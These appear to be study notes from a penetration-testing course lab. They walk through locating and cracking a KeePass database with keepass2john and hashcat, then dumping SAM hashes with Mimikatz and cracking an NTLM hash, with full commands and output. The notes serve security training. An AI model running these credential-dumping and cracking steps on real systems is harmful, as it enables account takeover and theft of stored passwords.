- We find `KeePass Password Safe 2.51.1` on system.
 - If we are unfamiliar, we should research it.
 - We discover the KeePass DB is stored as a `.kbdx` file.
  - Search the system for this extension.
```
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

Install the latest PowerShell for new features and improvements! https://aka.ms/PSWindows

PS C:\Users\jason> Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue


    Directory: C:\Users\jason\Documents


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         5/30/2022  10:33 AM           1982 Database.kdbx
```
- User PowerShell.
	- [Get-ChildItem](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.management/get-childitem)
 - Search the whole drive with `-Path C:\`
 - Specify file type with `-Include`
 - Get a list of files and sub dirs with `-File` and `-Recurse`
	- Silence errors and cont exec with `-ErrorAction` set to `SilentlyContinue`

We find the DB in the user's Documents folder.  Transfer the DB to our Kali system in preparation for the attack.  Thus completing the first step of our methodology.

Next, tranform the has into a format our cracking tool can use.
- JtR suite includes various transformation scripts.
	- [ssh2john](https://github.com/openwall/john/blob/bleeding-jumbo/run/ssh2john.py)
	- [keepass2john](https://github.com/openwall/john/blob/bleeding-jumbo/src/keepass2john.c)
 - These are installed by default in Kali.
  - They can also format for Hashcat!

We will use `keepass2john` to format the DB and save the output as `keepass.hash`.
```bash
┌──(operator㉿labhost)-[~/OffSec/password-attacks]
└─$ keepass2john Database.kdbx > keepass.hash

┌──(operator㉿labhost)-[~/OffSec/password-attacks]
└─$ cat keepass.hash            
Database:$keepass$*2*60*0*d74e29a727e9338717d27a7d457ba3486d20dec73a9db1a7fbc7a068c9aec6bd*04b0bfd787898d8dcd4d463ee768e55337ff001ddfac98c961219d942fb0cfba*5273cc73b9584fbd843d1ee309d2ba47*1dcad0a3e50f684510c5ab14e1eecbb63671acae14a77eff9aa319b63d71ddb9*17c3ebc9c4c3535689cb9cb501284203b7c66b0ae2fbf0c2763ee920277496c1
```
- Before we can work with it, we need to modify it further.
- The JtR script prepended the filename `Database` to the hash.
 - It does this to act as the username for the hash.
  - Helpful when cracking DB hashes as we want the output to contain the username:password pairs.
 - Since KeePass uess a master password without a username we must remove the `Database:` string.
```bash
┌──(operator㉿labhost)-[~/OffSec/password-attacks]
└─$ cat keepass.hash
$keepass$*2*60*0*d74e29a727e9338717d27a7d457ba3486d20dec73a9db1a7fbc7a068c9aec6bd*04b0bfd787898d8dcd4d463ee768e55337ff001ddfac98c961219d942fb0cfba*5273cc73b9584fbd843d1ee309d2ba47*1dcad0a3e50f684510c5ab14e1eecbb63671acae14a77eff9aa319b63d71ddb9*17c3ebc9c4c3535689cb9cb501284203b7c66b0ae2fbf0c2763ee920277496c1
```
- The hash is now in the correct format for Hashcat!

Now we must determine the correct hash type.
- To determine this hashtype.
 - We can look it up in the Hashcat wiki.
 - Or grep Hashcat help.
```bash
┌──(operator㉿labhost)-[~/OffSec/password-attacks]
└─$ hashcat --help | grep -i "KeePass"
  13400 | KeePass 1 (AES/Twofish) and KeePass 2 (AES)                | Password Manager
  29700 | KeePass 1 (AES/Twofish) and KeePass 2 (AES) - keyfile only mode | Password Manager
```
- The correct mode appears to be `13400`

We will skip step 3, cracking time calculation, since this is a simple example.

Next we prepare our wordlist.
- We will use a Hashcat provided rule `rockyou-30000.rule`
 - Combining this with the `rockyou.txt` wordlist.
 - This rule is highly effect with the rockyou wordlist as it was tailored for it.

We have prepared everything and are ready to begin out attack!  Run Hashcat with the requisite arguments.
```bash
┌──(operator㉿labhost)-[~/OffSec/password-attacks]
└─$ hashcat -m 13400 keepass.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/rockyou-30000.rule --force
hashcat (v6.2.6) starting

...

$keepass$*2*60*0*d74e29a727e9338717d27a7d457ba3486d20dec73a9db1a7fbc7a068c9aec6bd*04b0bfd787898d8dcd4d463ee768e55337ff001ddfac98c961219d942fb0cfba*5273cc73b9584fbd843d1ee309d2ba47*1dcad0a3e50f684510c5ab14e1eecbb63671acae14a77eff9aa319b63d71ddb9*17c3ebc9c4c3535689cb9cb501284203b7c66b0ae2fbf0c2763ee920277496c1:qwertyuiop123!
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 13400 (KeePass 1 (AES/Twofish) and KeePass 2 (AES))
Hash.Target......: $keepass$*2*60*0*d74e29a727e9338717d27a7d457ba3486d...7496c1
Time.Started.....: Sun Oct  1 10:21:42 2023, (35 secs)
Time.Estimated...: Sun Oct  1 10:22:17 2023, (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Mod........: Rules (/usr/share/hashcat/rules/rockyou-30000.rule)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:    92358 H/s (10.34ms) @ Accel:128 Loops:60 Thr:1 Vec:16
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 3213312/430331550000 (0.00%)
Rejected.........: 0/3213312 (0.00%)
Restore.Point....: 0/14344385 (0.00%)
Restore.Sub.#1...: Salt:0 Amplifier:3137-3138 Iteration:0-60
Candidate.Engine.: Device Generator
Candidates.#1....: 123456123! -> bethany123!
Hardware.Mon.#1..: Temp: 57c Util: 97%

Started: Sun Oct  1 10:21:22 2023
Stopped: Sun Oct  1 10:22:18 2023
```
- We have recovered `qwertyuiop123!`
- Run KeePass on our target system and enter the master pass when prompted.
 - We now have access to all of the user's saved passwords.

## 15.3 Working with Password Hashes

- Obtain and crack NTLM hashes
- Pass NTLM hashes
- Obtain and crack Net-NTLMv2 hashes
- Relay Net-NTLMv2 hashes

*While in most assignments we'll face an Active Directory environment, this Learning Unit only covers local Windows machines. However, the skills learned here are a stepping stone to the later Active Directory Modules in this course.*

For this, we'll cover two different hash implementations on Windows: 
- [NT LAN Manager (NTLM)](https://en.wikipedia.org/wiki/NT_LAN_Manager)
- [Net-NTLMv2.4](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-nlmp/5e550938-91d4-459f-b67d-75d70009e3f3)


### Cracking NTLM

Windows stores hased user passwords in the [Security Account Manager (SAM)](https://en.wikipedia.org/wiki/Security_Account_Manager) DB file, used to auth local and remote accounts.

*To deter offline SAM database password attacks, Microsoft introduced the SYSKEY feature in Windows NT 4.0 SP3, which partially encrypts the SAM file. The passwords can be stored in two different hash formats: LAN Manager (LM)2 and NTLM. LM is based on DES,3 and is known to be very weak. For example, passwords are case insensitive and cannot exceed fourteen characters. If a password exceeds seven characters, it is split into two strings, each hashed separately. LM is disabled by default beginning with Windows Vista and Windows Server 2008.*

On modern systems, the SAM hashes are stored as NTLM.  This hash fixes many of the weaknesses of LM, i.e. passwords are case sensitive and no longer split into smaller, weaker, hashes.  However, NTLM hashes stored in the SAM DB are not salted.

[Salts](https://en.wikipedia.org/wiki/Salt_(cryptography)) are random buts appended to a password *before* it is hashed.  They are used to prevent an attack in which attackers pre-compute a list of hashes and then perform lookups on these precomputed hashes to infer the plaintext password.  A list or table of precomputed passwords is called a [Rainbow Table](https://en.wikipedia.org/wiki/Rainbow_table), the attack is known as a Rainbow Table Attack.

*We use "NTLM hash" to refer to the formally correct NTHash. Since "NTLM hash" is more commonly used in our industry, we use it in this course to avoid confusion.*

We cannot perform operations on the SAM DB (copy/rename/move) in **C:\Windows\system32\config\sam** while Win is running, the kernel keeps and exclusive file system lock on it.  However, this restriction can be bypassed with a [Mimikatz](https://github.com/gentilkiwi/mimikatz).

Mimikatz provides functions to extract plain-text passwords and password hashes, from various Win sources, and further leverage them in attack vectors like [pass-the-hash](https://en.wikipedia.org/wiki/Pass_the_hash).  Mimikatz **sekurlsa** module extracts hashes from the [Local Security Authority Subsystem (LSASS)](https://en.wikipedia.org/wiki/Local_Security_Authority_Subsystem_Service).  LSASS is a Win process that handles auth, password change, and [access tokens](https://docs.microsoft.com/en-us/windows/win32/secauthz/access-tokens).

LSASS caches NTLM hashes and other creds, which can be extracted with Mimikatz **sekurlsa** module.  We need to understand that LSASS runs under the SYSTEM user, with higher privs than Administrator.  Therefore, we can only extract passwords if we are running Mimikatz as Administrator or higher, with [SeDebugPrivilege](https://devblogs.microsoft.com/oldnewthing/20080314-00/?p=23113).  This access right allows the debugging of processes we own and those of other users.

We can elevate our privs to SYSTEM with tools like [PsExec](https://docs.microsoft.com/en-us/sysinternals/downloads/psexec) or Mimikatz [token elevation function](https://github.com/gentilkiwi/mimikatz/wiki/module-~-token).  The token elevation function requires [SeImpersonatePrivilege](https://docs.microsoft.com/en-us/troubleshoot/windows-server/windows-security/seimpersonateprivilege-secreateglobalprivilege) access right, with all local Admin accounts have by default.

Now let's demonstrate how to obtain and crack NTLM hashes.  We will retrieve passwords from the SAM of the MARKETINGWK01 machine, log in via RDP with the creds provided in the lab machine below.
- Start with Get-LocalUser
	- checking wich users exist locally on the system
```powershell
PS C:\Users\offsec> Get-LocalUser

Name               Enabled Description
----               ------- -----------
Administrator      False   Built-in account for administering the computer/domain
DefaultAccount     False   A user account managed by the system.
Guest              False   Built-in account for guest access to the computer/domain
nelly              True
offsec             True
sam                True
WDAGUtilityAccount False   A user account managed and used by the system for Windows Defender Application Guard scen...
```
- The output indicates the existence of another user, `nelly`
	- we will obtain nelly's plain text password by retrieving the NTLM hash and cracking it
- We know the creds of users are stored when they log on to a Win sys
	- however, creds are stored in other ways
		- i.e. when a service is run with a user account
- We will use Mimikatz to check for stored creds on the system
	- `C:\tools\mimikatz.exe`
	- Start PowerShell as Admin
		- confirm the UAC popup
	- start Mimikatz
```powershell
PS C:\tools> .\mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 Aug 10 2021 17:19:53
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz #
```
- We can now interact with Mimikatz CLI env
	- each command consists of a module and command delimited by two colons
		- i.e. `privilege::debug`
- We can use various commands to extract passwords from the system
	- common command to attempt to extract plaintext passwords and password hashes from all source: `sekurlsa::logonpasswords`
		- *This generates a huge amount of output*
	- We can instead extract NTLM hashes from SAM with: `lsadump::sam`
		- first gain SYSTEM privs with: `token::elevate`
	- Both commands require **SeDebugPrivilege** which we attain with: `privilege::debug`
```bash
mimikatz # privilege::debug
Privilege '20' OK

mimikatz # token::elevate
Token Id  : 0
User name :
SID name  : NT AUTHORITY\SYSTEM

652     {0;000003e7} 1 D 41117          NT AUTHORITY\SYSTEM     S-1-5-18        (04g,21p)       Primary
 -> Impersonated !
 * Process Token : {0;002189f0} 2 F 3171076     MARKETINGWK01\offsec    S-1-5-21-4264639230-2296035194-3358247000-1001  (14g,24p)       Primary.
 * Thread Token  : {0;000003e7} 1 D 3533913     NT AUTHORITY\SYSTEM     S-1-5-18        (04g,21p)       Impersonation (Delegation)

mimikatz # lsadump::sam
Domain : MARKETINGWK01
SysKey : 2a0e15573f9ce6cdd6a1c62d222035d5
Local SID : S-1-5-21-4264639230-2296035194-3358247000

SAMKey : 38e2cdfccc1d5220e001dd7d9b6186b3

RID  : 000001f4 (500)
User : Administrator

RID  : 000001f5 (501)
User : Guest

RID  : 000001f7 (503)
User : DefaultAccount

RID  : 000001f8 (504)
User : WDAGUtilityAccount
  Hash NTLM: c17a032e0528525ad763c0bec3658226

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *.
    Random Value : f39c5178d64eb4811f0e24caddc71880

* Primary:Kerberos-Newer-Keys *.
    Default Salt : WDAGUtilityAccount
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : 98c4bca33a76248827ddb6d7f5af7e5cc31742eab603ef34944cc4055052bb28
      aes128_hmac       (4096) : f4f2779905636ac6d8a3dbcccd3da7ad
      des_cbc_md5       (4096) : fe76fd5291a4b0d0

* Packages *.
    NTLM-Strong-NTOWF

* Primary:Kerberos *.
    Default Salt : WDAGUtilityAccount
    Credentials
      des_cbc_md5       : fe76fd5291a4b0d0


RID  : 000003e9 (1001)
User : offsec
  Hash NTLM: 2892d26cdf84d7a70e2eb3b9f05c425e

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *.
    Random Value : 4afc51d3706e26bc98dc90db9a50826a

* Primary:Kerberos-Newer-Keys *.
    Default Salt : MARKETINGWK01offsec
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : 84ec02ea2dd7eb6df176b7abf418babc44e3b082a787ccebe386141eae88385e
      aes128_hmac       (4096) : 32d058faeea4ca20356399fcf099fcbd
      des_cbc_md5       (4096) : c8e60ecb689e1543
    OldCredentials
      aes256_hmac       (4096) : 8d6689fa7fb0321706ad1363167429077dcbfa1ad76e74f95ce2f58993c36eff
      aes128_hmac       (4096) : 0bdfdee532724ecdb9f09b62dca4e2be
      des_cbc_md5       (4096) : ab3b75862cc1c4b0
    OlderCredentials
      aes256_hmac       (4096) : 00df88a3ea2cc3bac58ea0ced5304301dbcdfb7c9440e3bba8fcaf07522a1902
      aes128_hmac       (4096) : e967183d09db853175ae40e7a57d72ae
      des_cbc_md5       (4096) : 9da4c20dad25046b

* Packages *.
    NTLM-Strong-NTOWF

* Primary:Kerberos *.
    Default Salt : MARKETINGWK01offsec
    Credentials
      des_cbc_md5       : c8e60ecb689e1543
    OldCredentials
      des_cbc_md5       : ab3b75862cc1c4b0


RID  : 000003ea (1002)
User : nelly
  Hash NTLM: 3ae8e5f0ffabb3a627672e1600f1ba10

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *.
    Random Value : 5036485b9af540fede9a4d43ab6fdc26

* Primary:Kerberos-Newer-Keys *.
    Default Salt : DESKTOP-6OLBM9Onelly
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : 14f048dbb1b6ba68a3b4238903c9e78bb464cc1f7518b11f78060cd4b611c7f1
      aes128_hmac       (4096) : 6caf98fbd609091c175881acff85a35d
      des_cbc_md5       (4096) : 7fd6f702615e0e75
    OldCredentials
      aes256_hmac       (4096) : 14f048dbb1b6ba68a3b4238903c9e78bb464cc1f7518b11f78060cd4b611c7f1
      aes128_hmac       (4096) : 6caf98fbd609091c175881acff85a35d
      des_cbc_md5       (4096) : 7fd6f702615e0e75

* Packages *.
    NTLM-Strong-NTOWF

* Primary:Kerberos *.
    Default Salt : DESKTOP-6OLBM9Onelly
    Credentials
      des_cbc_md5       : 7fd6f702615e0e75
    OldCredentials
      des_cbc_md5       : 7fd6f702615e0e75


RID  : 000003ec (1004)
User : sam
  Hash NTLM: fa146c495c3c815edd0634d05c9af84a

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *.
    Random Value : 66cddd0487d89de32b89af88a6b241f6

* Primary:Kerberos-Newer-Keys *.
    Default Salt : MARKETINGWK01sam
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : 6e2365f44e0493fbf27a38b27e5379b1222cc2daf3b6ba19e5cdf21f58cbdfc2
      aes128_hmac       (4096) : e4033c4aa78d497c074b51186337fb44
      des_cbc_md5       (4096) : 155125d375579ed9
    OldCredentials
      aes256_hmac       (4096) : 291f17037d8e5cded6f2a9a3e3f9afe69e31cd467a2028501f5ef55f8ad45a28
      aes128_hmac       (4096) : e9ac280a18a224ecee35956c0b1c2217
      des_cbc_md5       (4096) : 83abf758d62ae9d5
    OlderCredentials
      aes256_hmac       (4096) : 291f17037d8e5cded6f2a9a3e3f9afe69e31cd467a2028501f5ef55f8ad45a28
      aes128_hmac       (4096) : e9ac280a18a224ecee35956c0b1c2217
      des_cbc_md5       (4096) : 83abf758d62ae9d5

* Packages *.
    NTLM-Strong-NTOWF

* Primary:Kerberos *.
    Default Salt : MARKETINGWK01sam
    Credentials
      des_cbc_md5       : 155125d375579ed9
    OldCredentials
      des_cbc_md5       : 83abf758d62ae9d5
```
- We have obtained the NTLM hash for nelly
	- `3ae8e5f0ffabb3a627672e1600f1ba10`
	- we will copy this to `nelly.hash` on our attacking machine
- Next we get the correct hash mode from Hashcat for OS NTLM
```bash
┌──(operator㉿labhost)-[~/OffSec/password-attacks]
└─$ echo -n "3ae8e5f0ffabb3a627672e1600f1ba10" > nelly.hash      
                                                                                                      
┌──(operator㉿labhost)-[~/OffSec/password-attacks]
└─$ cat nelly.hash 
3ae8e5f0ffabb3a627672e1600f1ba10                                                                                                      
┌──(operator㉿labhost)-[~/OffSec/password-attacks]
└─$ hashcat --help | grep -i "ntlm"   
   5500 | NetNTLMv1 / NetNTLMv1+ESS                                  | Network Protocol
  27000 | NetNTLMv1 / NetNTLMv1+ESS (NT)                             | Network Protocol
   5600 | NetNTLMv2                                                  | Network Protocol
  27100 | NetNTLMv2 (NT)                                             | Network Protocol
   1000 | NTLM                                                       | Operating System
```
- the correct mode is `1000`
- The Mimikatz output is already in a form that Hashcat accepts
- Next we choose a wordlist and rule file
	- wordlist `rockyou.txt`
	- rule `best64.rule`
		- containing 64 highly effective rules
- Now we can start our attack
```bash
┌──(operator㉿labhost)-[~/OffSec/password-attacks]
└─$ hashcat -m 1000 nelly.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
hashcat (v6.2.6) starting

...

3ae8e5f0ffabb3a627672e1600f1ba10:nicole1                  
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 1000 (NTLM)
Hash.Target......: 3ae8e5f0ffabb3a627672e1600f1ba10
Time.Started.....: Mon Oct  2 14:45:23 2023, (0 secs)
Time.Estimated...: Mon Oct  2 14:45:23 2023, (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Mod........: Rules (/usr/share/hashcat/rules/best64.rule)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........: 37229.3 kH/s (8.02ms) @ Accel:512 Loops:77 Thr:1 Vec:16
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 315392/1104517645 (0.03%)
Rejected.........: 0/315392 (0.00%)
Restore.Point....: 0/14344385 (0.00%)
Restore.Sub.#1...: Salt:0 Amplifier:0-77 Iteration:0-77
Candidate.Engine.: Device Generator
Candidates.#1....: 123456 -> oooooo
Hardware.Mon.#1..: Temp: 46c Util: 14%

Started: Mon Oct  2 14:45:08 2023
Stopped: Mon Oct  2 14:45:25 2023
```
- we have retrieved `nicole1` from the NTLM hash

